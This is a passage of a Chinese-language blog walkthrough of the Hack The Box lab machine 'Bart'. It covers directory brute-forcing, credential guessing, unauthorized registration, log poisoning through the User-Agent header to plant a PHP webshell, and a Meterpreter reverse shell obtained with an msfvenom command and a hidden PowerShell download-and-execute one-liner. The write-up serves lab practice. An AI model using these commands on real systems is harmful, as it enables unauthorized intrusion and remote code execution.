<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165354733.png" srcset="/img/loading.gif" lazyload alt="image-20220405165354733"  />

<p>而我试着去打开它，它页面是这样的，而同样的，返回包中也没有其他对我有用的信息，没有WAF特征信息：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165526148.png" srcset="/img/loading.gif" lazyload alt="image-20220405165526148"></p>
<p>同样的，扫描器也没为我探测到WAF：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165636398.png" srcset="/img/loading.gif" lazyload alt="image-20220405165636398"  />

<p>我尝试对以IP为参数对其进行目录爆破,同样的，它也为我返回了200OK状态码的图片页面。至此我认为，WEB站点下边确实会存在某些目录，只是我通过扫描器提交了不存在的目录名被某种防护机制重定向到了该状态码为200OK的图片页面。因为它主域名bart.htb或是10.10.10.81返回给我的是200图片页面，而它的子域名forum.bart.htb返回给我的是一个500状态码包含服务器错误信息的页面。</p>
<p>所以我猜测，目标的web结构是以10.10.10.81，也就是bart.htb为根目录，当访问根目录下不存在的目录会跳转到200OK图片页面，而forum.bart.htb是它根目录下的某个目录，只是通过IIS服务将其解析到了子域名的默认根目录。那么我访问到的子域名forum.bart.htb，它的完整路径应该类似于：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bart.htb/forum</span><br></pre></td></tr></table></figure>

<p>或是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.81/forum</span><br></pre></td></tr></table></figure>

<p>当然它也可能是forum.bart，forum.bart.htb，完全无所谓，我可以都试试，为了不影响我的结论，我需要把&#x2F;etc&#x2F;hosts中的信息更改一下，因为我先前填的是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.81 forum.bart.htb</span><br></pre></td></tr></table></figure>

<p>在bart.htb无法访问时我尝试去将其更改过，但是bart.htb依然无法正常访问，我始终在纠结bart.htb究竟存不存在。现在如果根据我刚刚的想法，它确实应该是存在的，我就需要将更改为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.81 bart.htb</span><br></pre></td></tr></table></figure>

<p>那么我验证自己的想法会很简单，我只需要尝试去访问如下目录，当然它也可能是其他的目录，但是我觉得这种情况应该很少或是不会出现，因为如果一个企业这么做了，那么如果它对应的岗位负责人更换了，新人面对这样的处境将会很麻烦从而出现工作交接困难的情况，企业是不会允许这种情况的，虽然它只是个靶场，但我觉得应该也会符合情理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://bart.htb/forum</span><br><span class="line">http://bart.htb/forum.bart</span><br><span class="line">http://bart.htb/forum.bart.htb</span><br></pre></td></tr></table></figure>

<p>我非常幸运，只尝试了第一个地址，它就成功的返回了我子域名forum.bart.htb的页面：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405173845895.png" srcset="/img/loading.gif" lazyload alt="image-20220405173845895"  />

<p>可现在有一种令我很头疼的事情，我如果在当前根目录进行爆破的话，它就会将我重定向到200OK的图片页面，而且现在看来，它或许一个目录对应一个子域名，如果是在外部的网络环境，我可以通过查询DNS解析记录IP反查域名来寻找它的旁站，可是HTB的靶场是通过它特定的VPN进行连接的，我与目标机器处于同一个内网环境中，没有DNS解析记录供我查询。那么我就只能盲猜，还是毫无根据的盲猜。</p>
<p>当然我是不愿意的，毫无根据的做事在我看来便是吃力不讨好，我想着能否把200状态码给过滤掉，因为200状态码便是那个图片页面，让扫描器屏蔽到所有的200状态码，但是如果我请求到正确的目录呢？这时我想到如果我通过url地址请求到正确的目录，那么解析服务组件会在我请求的目录下寻找默认的index.html或是php等默认的首页返回给我，这又何尝不算是一种重定向呢，既然重定向那它的状态码应为3xx，为了验证我的想法，我又尝试访问<a target="_blank" rel="noopener" href="http://bart.htb/forum%EF%BC%8C%E6%88%91%E7%9A%84%E7%8C%9C%E6%B5%8B%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%BE%88%E9%AB%98%E5%85%B4%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E7%9A%84%E7%8C%9C%E6%B5%8B%E4%B9%9F%E5%AF%B9%E4%BA%86%EF%BC%9A">http://bart.htb/forum，我的猜测是错误的，但是我很高兴，因为我的猜测也对了：</a></p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405180253698.png" srcset="/img/loading.gif" lazyload alt="image-20220405180253698"  />

<p>它确实不是3xx的重定向状态码，但是它是206状态码，虽然我无法确定其他目录的状态是什么，但是它应该不会是200，我或许真的可以过滤掉所有的200状态码对目标路径再进行一次爆破，而且很幸运，Gobuster有这一项功能，但是不知为何我过滤失败了。</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405194403635.png" srcset="/img/loading.gif" lazyload alt="image-20220405194403635"  />

<p>幸运的是我发现了另一款工具，Kalinux自带wfuzz，-hh参数是表示过滤掉返回信息中包含指定内容的消息，例如该环境中，如果我不使用-hh参数的话，它会返回一堆不存在的目录状态码为200：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bart.htb/FUZZ</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405210655782.png" srcset="/img/loading.gif" lazyload alt="image-20220405210655782"  />

<p>当然它们还是指向的那个错误图片页面，如果我想过滤掉返回信息为那个错误图片的页面，又不想因为200状态码过滤掉其他我不希望的文件或目录，我就可以选择如上图的630或是5628或是150693用-hh参数添加为我希望过滤掉的条件，它就会为我过滤掉符合条件的信息目录，然后把其他的条件为我显示打印出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 150693 http://bart.htb/FUZZ </span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405211149549.png" srcset="/img/loading.gif" lazyload alt="image-20220405211149549"  />

<p>它很慢很慢，因为有22万的字典参数，还有受网络延迟影响的效率，我等了有十几分钟，它为我列出了一个新的目录：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405213702686.png" srcset="/img/loading.gif" lazyload alt="image-20220405213702686"  />

<p>但是我并不准备挂掉它，我希望它能为我枚举到更多的信息，而且如果我这时候对目标monitor进行访问，又会慢很多很多，所以我决定再等它一会儿，然而我又等了十几分钟，它为我枚举到的还是monitor，我不得不先挂掉它，我先访问monitor试试，如果我又一筹莫展，我会考虑再请求它帮我枚举一次，于是我访问了monitor目录，确切的说它是一个子域名：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214446477.png" srcset="/img/loading.gif" lazyload alt="image-20220405214446477"  />

<p>我访问到了，它是一个登录框，而它的目录名翻译中文是监测的意思，我觉得它像是一个管理型后台登录页面。而左下角显示了它的版本信息，我准备先对其进行公开漏洞搜索：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214725656.png" srcset="/img/loading.gif" lazyload alt="image-20220405214725656"  />

<p>好吧，它什么也没有，于是我觉得去搜寻一下PHP Server Monitor v3.2.1，当你我希望知道某个组件的具体信息，最有用最直接最省力的便是去它的官方看帮助文档，该环境很贴心的为我准备了它官网的超链接，但我点进去发现一个有意思的事情，它的版本号为3.2.1，而我在它官网文档查看时，对了，这是它的官网链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.phpservermonitor.org/</span><br></pre></td></tr></table></figure>

<p>我一度以为是我还处于内网环境中，但我觉得不对劲，我用我没走VPN的宿主机访问了一次，该组件只发布到了3.2.0，最重要的是我的目标机器发布到HTB好久了：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215211649.png" srcset="/img/loading.gif" lazyload alt="image-20220405215211649"  />

<p>似乎出现了某种超前的现象，我觉得是人为进行混淆更改的，它想混淆我的视听，但是这并不能影响我很多，从PHP Server Monitor官网可获取到很多信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215711165.png" srcset="/img/loading.gif" lazyload alt="image-20220405215711165"  />

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215734881.png" srcset="/img/loading.gif" lazyload alt="image-20220405215734881"  />

<p>我简单概括一下，该组件可用于管理服务器上运行的服务，站点项目，还有一个cronjob看起来像是计划任务，而目标操作系统是windows，windows上运行的服务通常是以高权限运行的，如果能够通过PHP Server Monitor进行管理，那PHP Server Monitor也应是具有高权限的，因为它要对系统服务进行操控。</p>
<p>或是它每次操作系统内部服务，系统内部会对其进行身份认证校验，好比某些工具调用其他第三方API需要在配置文件中有对应的账户口令或是key，而对应的账户一定是具有管理员级别权限的。</p>
<p>那么我的思路会很明确，进入该后台并查看某些与系统交互的地方，或是它的配置文件中保存的口令，当然有个前提，我需要进入。我先尝试了普通的弱口令，都回复了我信息不正确的错误 信息。我尝试使用我在forum.bart.htb收集到的用户名，可惜它都返回给了我同样的信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405221651760.png" srcset="/img/loading.gif" lazyload alt="image-20220405221651760"  />

<p>在当前页面我无法枚举用户名，当然我可以尝试注入漏洞，但是我觉得可以先到Forgot Password去看一眼，因为找回密码通常会使用邮箱信息，而我有在forum.bart.htb子域名收集到一些，比起注入显得更有优势，我点进去发现它要求我输入用户名：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222003560.png" srcset="/img/loading.gif" lazyload alt="image-20220405222003560"  />

<p>而我在尝试输入用户名后，它会提示无法检测到用户名：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222141984.png" srcset="/img/loading.gif" lazyload alt="image-20220405222141984"  />

<p>我猜测它像是我输入的用户名不存在的意思，所以我又尝试了其他的人的姓例如simmons 、hilton、doe、potter，当然还有它们的名，国外名在前，姓在后，samantha daniel robert jane，当然还有在注释中发现的harvey，当我使用harvey后它提示我向harvey邮箱发送了一封电子邮件：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222828366.png" srcset="/img/loading.gif" lazyload alt="image-20220405222828366"  />

<p>我准备用Burpsuite进行爆破，因为在我对目标检测时，Burpsuite抓到了一些其他东西：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223437709.png" srcset="/img/loading.gif" lazyload alt="image-20220405223437709"  />

<p>我尝试把收集到的用户名进行不同的组合，添加到了弱口令字典中，也幸好我将其添加进了字典中，因为它最后跑出来的结果：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223757401.png" srcset="/img/loading.gif" lazyload alt="image-20220405223757401"  />

<p>我拿到了一组可用来登录的用户名,我成功登录了进去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">harvey:potter</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224322773.png" srcset="/img/loading.gif" lazyload alt="image-20220405224322773"  />

<p>它的Update我点不了，help会跳转到PHP server monitor官方，而status或servers与log都是一样的页面，并没有能与目标机器系统交互的地方，不过它确实提供给我一个重要的信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224835686.png" srcset="/img/loading.gif" lazyload alt="image-20220405224835686"  />

<p>我又获取到了一个新域名，在目标80端口上。于是我又不得不更改&#x2F;etc&#x2F;hosts，将以下域名记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">internal-01.bart.htb</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225429409.png" srcset="/img/loading.gif" lazyload alt="image-20220405225429409"  />

<p>它又是一个登录框，而我刚刚获取到的密码在这里是不起作用的。我先对其进行了简单的SQL注入验证，它并没有反馈给我更多的信息，如出一辙的：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225813330.png" srcset="/img/loading.gif" lazyload alt="image-20220405225813330"  />

<p>我尝试查看源代码，它的注释中同样也没有什么信息，但是在我审查元素时候，我发现了一个有意思的事情：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406002756062.png" srcset="/img/loading.gif" lazyload alt="image-20220406002756062"  />

<p>当前页面为login_form.php，也就是登录表单，它提交到后端的代码文件为login.php，好像它将数据参数提交到了另一个脚本文件中，我尝试直接对login.php进行访问，当然这是妄想，我访问不到，它会把我重定向回来。</p>
<p>我尝试对它根目录进行访问，但是它还会将我重定向回该登录页面，于是我准备对目标根目录进行路径爆破：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230215042.png" srcset="/img/loading.gif" lazyload alt="image-20220405230215042"  />

<p>它帮我发现了一个log.txt，我尝试对其进行访问：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230334272.png" srcset="/img/loading.gif" lazyload alt="image-20220405230334272"  />

<p>我尝试对dirsearch为我枚举到的目录都访问一遍，但是它都返回给了我这样的错误信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230727090.png" srcset="/img/loading.gif" lazyload alt="image-20220405230727090"  />

<p>于是我又尝试对目标当前登录页面进行了目录爆破：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000242744.png" srcset="/img/loading.gif" lazyload alt="image-20220406000242744"  />

<p>我枚举到了一个register_form.php，它看起来像是一个注册页面，但是我无法访问它，一样的，我尝试根据刚才的发现访问register.php，它也是一直在加载中：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001152492.png" srcset="/img/loading.gif" lazyload alt="image-20220406001152492"  />Dirsearch倒是提醒了我，我在以Get方式发送请求爆破路径，或许我可以试试用Post。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -m post -u http://internal-01.bart.htb/simple_chat/</span><br></pre></td></tr></table></figure>

<p>可惜结果是一样的：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000818333.png" srcset="/img/loading.gif" lazyload alt="image-20220406000818333"  />

<p>或许我应该用POST方式去请求页面试一试，我选择用Burpsuite，我以POST进行访问，即使我什么参数都没提交它也应该返回给我个请输入参数或是参数为空的错误提示信息，然而目标什么都没有回我：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001349575.png" srcset="/img/loading.gif" lazyload alt="image-20220406001349575"  />

<p>或许是我需要添加个来源访问，通常注册按钮都在登录页面，可能它会校验来源例如Referer字段，可它还是没有理我：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001710829.png" srcset="/img/loading.gif" lazyload alt="image-20220406001710829"  />

<p>又或许是GET请求添加来源？可惜我还是失败了。在我准备拼运气爆破抓包的时候，我产生一个念头，或许我可以将login_from.php的数据包拦截抓取将其重定向提交到register_from.php或是register.php，那么我会不会不需要爆破正确的用户，而变成注册了一个合法的用户。我尝试将login.php替换为register.php：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004627992.png" srcset="/img/loading.gif" lazyload alt="image-20220406004627992"  />

<p>它竟然回应我了，它返回了302重定向，我想我添加的账号或许成功了。在我放完包关闭拦截请求的那一刻，页面跳转到了聊天软件页面，我成功了，我登录进去了：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004816336.png" srcset="/img/loading.gif" lazyload alt="image-20220406004816336"  />

<p>我高兴的试着跟它们聊天，然而它们不理我：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005000725.png" srcset="/img/loading.gif" lazyload alt="image-20220406005000725"  />

<p>当前页面一个有一个刷新按钮，没什么用，一个Logout退出，不可能的，我好不容易才进来。那就只剩一个log按钮了，我尝试点击它，它回应了我一个弹窗：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005214373.png" srcset="/img/loading.gif" lazyload alt="image-20220406005214373"  />

<p>哦，是两个弹窗：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005230236.png" srcset="/img/loading.gif" lazyload alt="image-20220406005230236"  />

<p>然而源代码中它并没有什么信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005452894.png" srcset="/img/loading.gif" lazyload alt="image-20220406005452894"  />

<p>我尝试拦截数据包，并提交了一份，它返回给我的信息是这样的：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005709339.png" srcset="/img/loading.gif" lazyload alt="image-20220406005709339"  />

<p>我不能改变参数，只要我在参数中添加或删除任何字符，服务器都会响应给我一个错误信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005915447.png" srcset="/img/loading.gif" lazyload alt="image-20220406005915447"  />

<p>我觉得它像是一个我多目标服务器发起了某种请求，而它返回给我一个弹窗例如成功 or 失败，我觉得它像是一个保存聊天记录的功能，但是它并不是保存在我本地，因为我本地并没有收到类似于下载或是另存为的请求弹窗，我觉得它是记录在目标机器中，如果它记录在目标机器中，那么它就需要调用类似于open()打开某个文件并写入write()等功能，对了，我前边是爆破出它的日志记录的&#x2F;log&#x2F;log.txt，但是我再去访问时，它的信息还是这样：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010714217.png" srcset="/img/loading.gif" lazyload alt="image-20220406010714217"  />

<p>而它的记录是浏览器头，或许是浏览器头有什么我们可用的地方？但是当我又点击聊天页面的log按钮时，Burpsuite为我拦截到了这个数据包：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010845604.png" srcset="/img/loading.gif" lazyload alt="image-20220406010845604"  />

<p>我当前用户不是harvey，但它提交的username参数值为harvey，我尝试更改为我当前用户worldisend，它第二个弹窗变成了0：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011033910.png" srcset="/img/loading.gif" lazyload alt="image-20220406011033910"  />

<p>在该过程中还会有一个奇怪的数据包：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011200783.png" srcset="/img/loading.gif" lazyload alt="image-20220406011200783"  />

<p>哦，是我请求太快了，不好意思。我尝试直接访问log&#x2F;log.php，说不定它解析错误我可以直接读到它的php代码，当然我是在妄想：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011557682.png" srcset="/img/loading.gif" lazyload alt="image-20220406011557682"  />

<p>我好像获取到了目标的绝对路径，但是我再去访问log.txt，它还是什么都没有：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011747275.png" srcset="/img/loading.gif" lazyload alt="image-20220406011747275"  />

<p>或许我不应该替换harvery，而是把浏览器头给替换一下，我尝试更改浏览器头：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011927514.png" srcset="/img/loading.gif" lazyload alt="image-20220406011927514"  />

<p>我还是失败了。它还是那样，或许我可以更改一下文件名？</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120306425.png" srcset="/img/loading.gif" lazyload alt="image-20220406120306425"  />

<p>它好像是成功了，并且第二个弹窗中的值为1：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120403506.png" srcset="/img/loading.gif" lazyload alt="image-20220406120403506"  />

<p>看起来它会接收用户数据包中的参数，例如户以及浏览器请求头然后将其写入到filename指定的文件中去，不如我再试一次：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120718898.png" srcset="/img/loading.gif" lazyload alt="image-20220406120718898"  />

<p>它返回了0：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120741967.png" srcset="/img/loading.gif" lazyload alt="image-20220406120741967"  />

<p>很抱歉，不行：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120824556.png" srcset="/img/loading.gif" lazyload alt="image-20220406120824556"  />

<p>梳理一下思路，首先文件名我是更改过的为hello.txt的，它貌似是可以正常访问，当然不排除目标可能有这个文件只是我路径爆破没爆破出来。那问题应该出现在用户名或是浏览器头上。而且貌似需要它的第二个弹窗为1，0表示失败，1代表成功。我尝试只更改用户名与文件名：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121400656.png" srcset="/img/loading.gif" lazyload alt="image-20220406121400656"  />

<p>它返回了0，而我访问不到文件：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121452796.png" srcset="/img/loading.gif" lazyload alt="image-20220406121452796"  />

<p>它的用户名好像是写死的，只能使用harvey，我尝试更改文件名与浏览器头：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121703977.png" srcset="/img/loading.gif" lazyload alt="image-20220406121703977"  />

<p>它返回了1：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121725016.png" srcset="/img/loading.gif" lazyload alt="image-20220406121725016"  />

<p>我成功了:</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121754837.png" srcset="/img/loading.gif" lazyload alt="image-20220406121754837"  />

<p>看来该系统会记录用户的浏览器头，并以日志的形式存储到某个文件，并且他有以下特征：</p>
<ol>
<li>文件名是我可以拦截数据包控制的。</li>
<li>用户名无法更改，必须是harvey。</li>
<li>它记录的是用户的浏览器请求头字段。</li>
</ol>
<p>或许我可以尝试将txt文件后缀改为PHP：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122250137.png" srcset="/img/loading.gif" lazyload alt="image-20220406122250137"  />

<p>哦它返回了1，我试着去访问我写入的phpinfo，YES！：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122512441.png" srcset="/img/loading.gif" lazyload alt="image-20220406122512441"  />

<p>我获取很多很多目标的信息：</p>
<p>目标系统为windows10、32位系统、并且它没有对PHP敏感函数做任何限制，意味着我可以使用命令函数实现远程RCE：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406123441403.png" srcset="/img/loading.gif" lazyload alt="image-20220406123441403"  />

<p>构造payload数据包：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125706194.png" srcset="/img/loading.gif" lazyload alt="image-20220406125706194"  />

<p>我成功了：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125904078.png" srcset="/img/loading.gif" lazyload alt="image-20220406125904078"  />

<p>我可以本地Metasploit生成powershell载荷：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=1121 -f psh-reflection &gt;/home/worldisend/x.ps1</span><br></pre></td></tr></table></figure>

<p>然后启动一个http服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>Matesploit启动对应的监听模块，然后将以下命令复制到webshell页面进行cmd参数提交，当然我试过直接将以下命令写入到payload数据包中的浏览器头字段中的<?php system()?>中，但它因为某种不知名原因失败了，所以还是老老实实一步一步走吧，别老是想着走捷径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.5:80/x.ps1&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132952924.png" srcset="/img/loading.gif" lazyload alt="image-20220406132952924"  />

<p>如果执行成功会像我下图右边，会有目标GET请求下载x.ps1的200状态码提示信息，我成功获取到了Meterpreter会话：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132914839.png" srcset="/img/loading.gif" lazyload alt="image-20220406132914839"  />

<p>然后发生了点意外，我手快运行getsystem直接获取到目标系统权限级别的Meterpreter：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406133430618.png" srcset="/img/loading.gif" lazyload alt="image-20220406133430618"  />

<p>root.txt标志在这里：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406135901838.png" srcset="/img/loading.gif" lazyload alt="image-20220406135901838"  />

<p>user.txt在这里：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406140027502.png" srcset="/img/loading.gif" lazyload alt="image-20220406140027502"  />

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough - Bart</div>
      <div>https://crazyinside.github.io/post/HackTheBox-Bart.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/HackTheBox-Bashed.html" title="HTB Walkthrough - Bashed">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB Walkthrough - Bashed</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/HackTheBox-BackendTwo.html" title="HTB Walkthrough - BackendTwo">
                        <span class="hidden-mobile">HTB Walkthrough - BackendTwo</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
